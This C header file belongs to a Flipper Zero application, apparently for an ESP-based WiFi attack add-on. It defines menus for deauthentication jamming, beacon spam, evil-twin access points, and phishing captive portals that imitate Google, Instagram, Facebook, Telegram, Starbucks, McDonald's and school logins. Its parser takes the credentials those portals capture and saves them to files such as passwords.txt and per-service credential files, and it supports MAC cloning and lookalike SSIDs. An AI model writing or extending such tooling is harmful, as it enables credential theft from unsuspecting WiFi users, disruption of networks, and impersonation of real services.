#pragma once

/* ── Kendi modüller ───────────────────────────────────────── */
#include "jam_flipper_app.h"
#include "jam_flipper_uart.h"
#include "jam_flipper_custom_event.h"
#include "scenes/jam_flipper_scene.h"

/* ── Furi SDK ────────────────────────────────────────────── */
#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/scene_manager.h>
#include <gui/modules/submenu.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/text_box.h>
#include <gui/modules/widget.h>
#include <gui/modules/text_input.h>
#include <expansion/expansion.h>
#include <notification/notification_messages.h>
#include <storage/storage.h>
#include <lib/datetime/datetime.h>
#include <furi_hal_rtc.h>

/* ── Sabitler ────────────────────────────────────────────── */
#define JAM_FLIPPER_TEXT_BOX_STORE_SIZE (4096)
#define JAM_FLIPPER_APP_FOLDER          "/ext/apps_data/jam_flipper"
#define JAM_FLIPPER_MAX_APS             64
#define JAM_FLIPPER_SSID_MAX            33
#define JAM_FLIPPER_BSSID_STR_LEN       18   /* "AA:BB:CC:DD:EE:FF\0" */
#define JAM_FLIPPER_LINE_BUF_SIZE       512  /* PCAP hex satırları için büyük */

/* ── View ID'leri ────────────────────────────────────────── */
typedef enum {
    JamFlipperAppViewSubmenu,        // Ana menü
    JamFlipperAppViewVarItemList,    // Ayar ekranları + hedef seçimi
    JamFlipperAppViewConsoleOutput,  // ESP'den gelen log/status
    JamFlipperAppViewWidget,         // Bilgi widget'ı
    JamFlipperAppViewTextInput,      // Metin girişi (WiFi şifresi vb.)
} JamFlipperAppView;

/* ── Menü İndeksleri ─────────────────────────────────────── */
typedef enum {
    /* ── Temel Saldırı Modları ─────────────────────────── */
    JamFlipperMenuIndexScanning,
    JamFlipperMenuIndexCompleteJam,
    JamFlipperMenuIndexWifiJam,
    JamFlipperMenuIndexListedDeauth,
    JamFlipperMenuIndexBeaconSpam,
    JamFlipperMenuIndexWifiSniff,
    JamFlipperMenuIndexEvilTwin,
    /* ── Separator: Beacon Portals ──────────────────────── */
    JamFlipperMenuIndexSepBeacon,      // Tıklanamaz ayırıcı
    /* ── Beacon Portal Modları (deauth YOK) ─────────────── */
    JamFlipperMenuIndexGLogin,         // G-Login Beacon
    JamFlipperMenuIndexIgLogin,        // Instagram Login Beacon
    JamFlipperMenuIndexFbLogin,        // Facebook Login Beacon
    JamFlipperMenuIndexTgmLogin,       // Telegram Login Beacon
    JamFlipperMenuIndexSbLogin,        // Starbucks Free WiFi Beacon
    JamFlipperMenuIndexMcLogin,        // McDonald's Free WiFi Beacon
    JamFlipperMenuIndexPubLogin,       // Public Wi-Fi Beacon
    JamFlipperMenuIndexSchLogin,       // School Login Beacon
    /* ── Separator: Targeted Portals ───────────────────── */
    JamFlipperMenuIndexSepTargeted,    // Tıklanamaz ayırıcı
    /* ── Targeted Portal Modları (deauth + portal) ──────── */
    JamFlipperMenuIndexTargetGLogin,   // Target G-Login
    JamFlipperMenuIndexTargetIgLogin,  // Target Instagram Login
    JamFlipperMenuIndexTargetFbLogin,  // Target Facebook Login
    JamFlipperMenuIndexTargetTgmLogin, // Target Telegram Login
    JamFlipperMenuIndexTargetSbLogin,  // Target Starbucks Login
    JamFlipperMenuIndexTargetMcLogin,  // Target McDonald's Login
    JamFlipperMenuIndexTargetPubLogin, // Target Public Wi-Fi
    JamFlipperMenuIndexTargetSchLogin, // Target School Login
    /* ── Separator: Settings ────────────────────────────── */
    JamFlipperMenuIndexSepSettings,    // Tıklanamaz ayırıcı
    JamFlipperMenuIndexSettings,
} JamFlipperMenuIndex;

/* ── Veri Modelleri ────────────────────────────────────────── */
typedef struct {
    char mac_str[18];
    bool selected;
} JamFlipperClient;

typedef struct {
    char    bssid_str[JAM_FLIPPER_BSSID_STR_LEN];
    char    ssid[JAM_FLIPPER_SSID_MAX];
    uint8_t channel;
    int8_t  rssi;
    bool    selected;

    /* Bu AP'ye bağlı yakalanan cihazlar */
    JamFlipperClient clients[8];
    uint8_t          client_count;
} JamFlipperAP;

/* ── PCAP Global Header (24 bytes) ───────────────────────── */
static const uint8_t PCAP_GLOBAL_HEADER[] = {
    0xD4, 0xC3, 0xB2, 0xA1, /* magic number      */
    0x02, 0x00,              /* version major (2)  */
    0x04, 0x00,              /* version minor (4)  */
    0x00, 0x00, 0x00, 0x00,  /* timezone (UTC)     */
    0x00, 0x00, 0x00, 0x00,  /* sigfigs            */
    0x80, 0x00, 0x00, 0x00,  /* snaplen (128)      */
    0x69, 0x00, 0x00, 0x00,  /* link type (105 = IEEE 802.11) */
};

/* ── Ana Uygulama Yapısı ─────────────────────────────────── */
struct JamFlipperApp {
    /* GUI modülleri */
    Gui*             gui;
    ViewDispatcher*  view_dispatcher;
    SceneManager*    scene_manager;
    Submenu*         submenu;
    VariableItemList* var_item_list;
    TextBox*         text_box;
    FuriString*      text_box_store;
    Widget*          widget;
    TextInput*       text_input;       // Metin girişi (WiFi şifresi vb.)

    /* UART */
    JamFlipperUart*  uart;

    /* Storage / PCAP */
    Storage*         storage;
    File*            pcap_file;
    bool             pcap_active;     // PCAP dosyasına yazılıyor mu?
    uint32_t         pcap_frame_count; // Yakalanan frame sayısı
    char             pcap_path[128];  // Aktif PCAP dosya yolu

    /* Saldırı parametreleri */
    uint8_t aggression;      // 0=Low, 1=Mid, 2=High
    uint8_t hop_speed;       // 0=50ms, 1=100ms, 2=200ms
    uint8_t scan_type;       // 0=Basic, 1=Logged(PCAP)
    uint8_t beacon_name_type;// 0=Random, 1=Custom List
    uint8_t beacon_interval; // 0=10s, 1=30s, 2=60s
    uint8_t ssid_list;       // 0=Top20, 1=Custom
    uint8_t portal_msg;      // 0=Update Req, 1=Free WiFi, 2=Maintenance, 3=Login Err
    uint8_t portal_enabled;  // 0=Off, 1=On
    uint8_t baud_rate;       // 0=115200, 1=230400, 2=921600
    uint8_t clone_mac;       // YENI: 0=No, 1=Yes (Evil Twin / T-GLogin MAC klonlama)
    uint8_t ssid_lookalike;  // YENI: 0=Clone tam id, 1=Lookalike (SSID'nin sonuna . koyar)

    /* Metin girişi buffer'ları */
    char    wifi_pass[64];   // YENI: Kullanıcının girdiği WiFi şifresi (Sniff/EvilTwin için)
    JamFlipperTextInputMode text_input_mode; // YENI: WifiPass sahnesinin ne dolduracağını belirtir

    /* Evil Twin / G-Login hedef bilgileri (AP seçiminden doldurulur) */
    char    evil_ssid[33];   // YENI: Hedef SSID
    char    evil_bssid[18];  // YENI: Hedef BSSID string ("XX:XX:XX:XX:XX:XX")
    uint8_t evil_channel;    // YENI: Hedef kanal

    /* Targeted Sniff hedef MAC */
    char    sniff_target_mac[18]; // YENI: Target sniff MAC string (ClientSelect'ten gelir)

    /* Aktif mod (hangi menüden geldi) */
    JamFlipperMenuIndex active_mode;

    /* Alt menüler için seçili AP index'i */
    int active_ap_index;

    /* Taranan AP listesi */
    JamFlipperAP scanned_aps[JAM_FLIPPER_MAX_APS];
    uint8_t      scanned_ap_count;

    /* UART satır ayrıştırma buffer'ı */
    char    line_buf[JAM_FLIPPER_LINE_BUF_SIZE];
    uint16_t line_idx;

    /* Durum */
    bool    attack_running;
};

/* ── Yardımcı: Hex decode ────────────────────────────────── */
static inline uint8_t hex_char_to_nibble(char c) {
    if(c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if(c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    if(c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    return 0;
}

static inline size_t hex_decode(const char* hex, uint8_t* out, size_t max_out) {
    size_t i = 0;
    while(hex[0] && hex[1] && i < max_out) {
        out[i++] = (hex_char_to_nibble(hex[0]) << 4) | hex_char_to_nibble(hex[1]);
        hex += 2;
    }
    return i;
}

/* ── Yardımcı: ESP'ye komut gönder ───────────────────────── */
static inline void jf_uart_send_str(JamFlipperApp* app, const char* cmd) {
    jam_flipper_uart_tx(app->uart, (uint8_t*)cmd, strlen(cmd));
    uint8_t nl = '\n';
    jam_flipper_uart_tx(app->uart, &nl, 1);
}

/* ── Yardımcı: PCAP dosyasını aç ────────────────────────── */
static inline bool jf_pcap_open(JamFlipperApp* app) {
    /* Dizini oluştur */
    storage_common_mkdir(app->storage, JAM_FLIPPER_APP_FOLDER);

    /* Dosya adı: SD root yerine kendi klasörü */
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    snprintf(app->pcap_path, sizeof(app->pcap_path),
             "/ext/apps_data/jam_flipper/cap_%04d%02d%02d_%02d%02d%02d.pcap",
             dt.year, dt.month, dt.day,
             dt.hour, dt.minute, dt.second);

    app->pcap_file = storage_file_alloc(app->storage);
    if(!storage_file_open(app->pcap_file, app->pcap_path,
                          FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_free(app->pcap_file);
        app->pcap_file = NULL;
        return false;
    }

    /* PCAP global header yaz */
    storage_file_write(app->pcap_file, PCAP_GLOBAL_HEADER, sizeof(PCAP_GLOBAL_HEADER));
    app->pcap_active = true;
    app->pcap_frame_count = 0;
    return true;
}

/* ── Yardımcı: PCAP dosyasını kapat ─────────────────────── */
static inline void jf_pcap_close(JamFlipperApp* app) {
    if(app->pcap_active && app->pcap_file) {
        storage_file_close(app->pcap_file);
        storage_file_free(app->pcap_file);
        app->pcap_file = NULL;
        app->pcap_active = false;
    }
}

/* ── UART'tan gelen satırı ayrıştır ──────────────────────── */
static inline void jf_parse_line(JamFlipperApp* app, const char* line) {
    /* ── AP: satırları → hedef listesi ───────────────────── */
    if(strncmp(line, "AP:", 3) == 0) {
        if(app->scanned_ap_count >= JAM_FLIPPER_MAX_APS) return;

        int idx, ch, rssi;
        char bssid[18];
        char ssid[33];

        int parsed = sscanf(line + 3, "%d,%17[^,],%32[^,],%d,%d",
                            &idx, bssid, ssid, &ch, &rssi);
        if(parsed >= 4) {
            JamFlipperAP* ap = &app->scanned_aps[app->scanned_ap_count];
            strncpy(ap->bssid_str, bssid, JAM_FLIPPER_BSSID_STR_LEN - 1);
            ap->bssid_str[JAM_FLIPPER_BSSID_STR_LEN - 1] = '\0';

            if(parsed >= 4) {
                strncpy(ap->ssid, ssid, JAM_FLIPPER_SSID_MAX - 1);
                ap->ssid[JAM_FLIPPER_SSID_MAX - 1] = '\0';
            } else {
                ap->ssid[0] = '\0';
            }

            ap->channel  = ch;
            ap->rssi     = rssi;
            ap->selected = false;
            ap->client_count = 0; // Başlangıçta 0

            app->scanned_ap_count++;
        }
    }
    /* ── CLI: satırları → İstemci listesi ─────────────────── */
    else if(strncmp(line, "CLI:", 4) == 0) {
        int ap_idx, client_count;
        if(sscanf(line + 4, "%d,%d", &ap_idx, &client_count) == 2) {
            if(ap_idx >= 0 && ap_idx < app->scanned_ap_count) {
                JamFlipperAP* ap = &app->scanned_aps[ap_idx];
                ap->client_count = client_count > 8 ? 8 : client_count;
                
                const char* ptr = strchr(line + 4, ',');
                if(ptr) ptr = strchr(ptr + 1, ','); // İkinci virgülü atla (ap_idx, client_count,)

                int c = 0;
                while(ptr && c < ap->client_count) {
                    ptr++; // Virgülü atla
                    char hex_mac[13] = {0};
                    strncpy(hex_mac, ptr, 12);
                    
                    if(strlen(hex_mac) == 12) {
                        snprintf(ap->clients[c].mac_str, 18, "%c%c:%c%c:%c%c:%c%c:%c%c:%c%c",
                            hex_mac[0], hex_mac[1], hex_mac[2], hex_mac[3],
                            hex_mac[4], hex_mac[5], hex_mac[6], hex_mac[7],
                            hex_mac[8], hex_mac[9], hex_mac[10], hex_mac[11]);
                        ap->clients[c].selected = true; // Flipper'da varsayılan olarak cihazlar atılsın
                        c++;
                    }
                    ptr = strchr(ptr, ',');
                }
            }
        }
    }
    /* ── LOG:PORTAL_DATA| → SD Karta Kaydet ──────────────── */
    else if(strncmp(line, "LOG:PORTAL_DATA|", 16) == 0) {
        const char* data = line + 16;
        size_t data_len = strlen(data);
        if(data_len > 0) {
            File* f = storage_file_alloc(app->storage);
            if(storage_file_open(f, "/ext/apps_data/jam_flipper/passwords.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
                storage_file_write(f, data, data_len);
                storage_file_write(f, "\r\n", 2);
                notification_message(furi_record_open(RECORD_NOTIFICATION), &sequence_single_vibro);
                furi_record_close(RECORD_NOTIFICATION);
                storage_file_sync(f);
            } else {
                notification_message(furi_record_open(RECORD_NOTIFICATION), &sequence_error);
                furi_record_close(RECORD_NOTIFICATION);
                furi_string_cat_printf(app->text_box_store, "ERROR: SD FATFS FAILED!\n");
                if(app->text_box) text_box_set_text(app->text_box, furi_string_get_cstr(app->text_box_store));
            }
            storage_file_close(f);
            storage_file_free(f);
        }
    }
    /* ── LOG:EVILTWIN_PASS| → Evil Twin WiFi şifresi → SD ── */
    else if(strncmp(line, "LOG:EVILTWIN_PASS|", 18) == 0) {
        const char* data = line + 18;
        size_t data_len = strlen(data);
        if(data_len > 0) {
            File* f = storage_file_alloc(app->storage);
            if(storage_file_open(f, "/ext/apps_data/jam_flipper/passwords.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
                const char prefix[] = "[EVILTWIN] ";
                storage_file_write(f, prefix, strlen(prefix));
                storage_file_write(f, data, data_len);
                storage_file_write(f, "\r\n", 2);
                /* Titreşim: şifre yakalandı */
                notification_message(furi_record_open(RECORD_NOTIFICATION), &sequence_single_vibro);
                furi_record_close(RECORD_NOTIFICATION);
                storage_file_sync(f);
            }
            storage_file_close(f);
            storage_file_free(f);
        }
    }
    /* ── LOG:GLOGIN_DATA| → Google Login credential → SD ─── */
    else if(strncmp(line, "LOG:GLOGIN_DATA|", 16) == 0) {
        const char* data = line + 16;
        size_t data_len = strlen(data);
        if(data_len > 0) {
            File* f = storage_file_alloc(app->storage);
            if(storage_file_open(f, "/ext/apps_data/jam_flipper/glogin_creds.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
                storage_file_write(f, data, data_len);
                storage_file_write(f, "\r\n", 2);
                notification_message(furi_record_open(RECORD_NOTIFICATION), &sequence_single_vibro);
                furi_record_close(RECORD_NOTIFICATION);
                storage_file_sync(f);
            }
            storage_file_close(f);
            storage_file_free(f);
        }
    }
    /* ── LOG:IGLOGIN_DATA| → Instagram credential → SD ──── */
    else if(strncmp(line, "LOG:IGLOGIN_DATA|", 17) == 0) {
        const char* data = line + 17;
        size_t data_len = strlen(data);
        if(data_len > 0) {
            File* f = storage_file_alloc(app->storage);
            if(storage_file_open(f, "/ext/apps_data/jam_flipper/iglogin_creds.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
                storage_file_write(f, data, data_len);
                storage_file_write(f, "\r\n", 2);
                notification_message(furi_record_open(RECORD_NOTIFICATION), &sequence_single_vibro);
                furi_record_close(RECORD_NOTIFICATION);
                storage_file_sync(f);
            }
            storage_file_close(f);
            storage_file_free(f);
        }
    }
    /* ── LOG:FBLOGIN_DATA| → Facebook credential → SD ───── */
    else if(strncmp(line, "LOG:FBLOGIN_DATA|", 17) == 0) {
        const char* data = line + 17;
        size_t data_len = strlen(data);
        if(data_len > 0) {
            File* f = storage_file_alloc(app->storage);
            if(storage_file_open(f, "/ext/apps_data/jam_flipper/fblogin_creds.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
                storage_file_write(f, data, data_len);
                storage_file_write(f, "\r\n", 2);
                notification_message(furi_record_open(RECORD_NOTIFICATION), &sequence_single_vibro);
                furi_record_close(RECORD_NOTIFICATION);
                storage_file_sync(f);
            }
            storage_file_close(f);
            storage_file_free(f);
        }
    }
    /* ── LOG:TGMLOGIN_DATA| → Telegram credential → SD ──── */
    else if(strncmp(line, "LOG:TGMLOGIN_DATA|", 18) == 0) {
        const char* data = line + 18;
        size_t data_len = strlen(data);
        if(data_len > 0) {
            File* f = storage_file_alloc(app->storage);
            if(storage_file_open(f, "/ext/apps_data/jam_flipper/tgmlogin_creds.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
                storage_file_write(f, data, data_len);
                storage_file_write(f, "\r\n", 2);
                notification_message(furi_record_open(RECORD_NOTIFICATION), &sequence_single_vibro);
                furi_record_close(RECORD_NOTIFICATION);
                storage_file_sync(f);
            }
            storage_file_close(f);
            storage_file_free(f);
        }
    }
    /* ── PCAP: satırları → dosyaya yaz ───────────────────── */
    else if(strncmp(line, "PCAP:", 5) == 0 && app->pcap_active && app->pcap_file) {
        /*
         * Format: PCAP:<pcap_record_header_hex><frame_data_hex>
         * pcap_record_header = 16 bytes (32 hex chars)
         * frame_data = up to 128 bytes (256 hex chars)
         * Total hex: up to 288 chars
         */
        const char* hex = line + 5;
        uint8_t bin[16 + 128]; /* 16 header + 128 data max */
        size_t decoded = hex_decode(hex, bin, sizeof(bin));

        if(decoded >= 16) { /* En az header kadar olmalı */
            storage_file_write(app->pcap_file, bin, decoded);
            app->pcap_frame_count++;
        }
    }
}
